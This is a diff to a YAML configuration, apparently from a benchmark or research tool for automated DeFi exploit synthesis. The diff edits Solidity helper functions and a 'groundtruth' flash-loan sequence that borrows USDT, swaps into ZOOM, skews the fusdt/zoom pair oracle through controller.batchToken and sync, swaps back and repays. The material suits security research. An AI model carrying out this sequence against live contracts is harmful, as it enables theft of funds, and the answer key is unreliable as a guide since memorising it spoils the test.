@@ -25,20 +25,21 @@ ctrt_name2deploy:
     ]
 
 extra_actions:
-  - "function addliquidity_pair_controller() internal {
+  - "function addliquidity_controller_pair_fusdt_fusdt() internal eurus {
     address[] memory n1 = new address[](1);
     n1[0] = address(pair);
     uint256[] memory n2 = new uint256[](1);
     n2[0] = fusdt.balanceOf(address(controller));
     controller.batchToken(n1, n2, address(fusdt));
+    pair.sync();
     }"
 
-  - "function swap_trader_usdt_zoom(uint256 amount) internal {
+  - "function swap_trader_attacker_usdt_zoom(uint256 amount, uint256 amountOut) internal eurus {
     usdt.approve(address(trader), type(uint256).max);
     trader.buy(amount);
     }"
 
-  - "function swap_trader_zoom_usdt(uint256 amount) internal {
+  - "function swap_trader_attacker_zoom_usdt(uint256 amount, uint256 amountOut) internal eurus {
     zoom.approve(address(trader), type(uint256).max);
     trader.sell(amount);
     }"
@@ -52,12 +53,11 @@ extra_statements: []
 attack_goal_str: "usdt"
 
 groundtruth:
-  - ["borrow", "owner", "usdt", "3000000e18"]
-  - ["swap", "trader", "usdt", "zoom", "usdt.balanceOf(attacker)"]
-  - ["addliquidity", "pair", "controller"]
-  - ["sync", "pair"]
-  - ["swap", "trader", "zoom", "usdt", "zoom.balanceOf(attacker)"]
-  - ["payback", "owner", "usdt", "3000000e18 * 1003 / 1000"]
+  - ["borrow", "usdt", "owner", "3000000e18"]
+  - ["swap", "trader", "attacker", "usdt", "zoom", "usdt.balanceOf(attacker)", "1"]
+  - ["addliquidity", "controller", "pair", "fusdt", "fusdt"]
+  - ["swap", "trader", "attacker", "zoom", "usdt", "zoom.balanceOf(attacker)", "1"]
+  - ["payback", "usdt", "owner", "3000000e18 * 1003 / 1000"]
 
 # Information for search space building.
 roles:
@@ -78,7 +78,8 @@ roles:
     hacked_oracles: ["pair"]
   "pair":
     is_swappair: true
-    uniswap_order: ["fusdt", "zoom"]
+    is_uniswap: true
+    token_pair: ["fusdt", "zoom"]
     support_swaps:
       "fusdt": ["fusdt", "zoom"]
       "zoom": ["fusdt", "zoom"]
@@ -86,6 +87,7 @@ roles:
     oracle: "pair"
   "trader":
     is_swappair: true
+    token_pair: ["usdt", "zoom"]
     support_swaps:
       "usdt": ["usdt", "zoom"]
       "zoom": ["usdt", "zoom"]
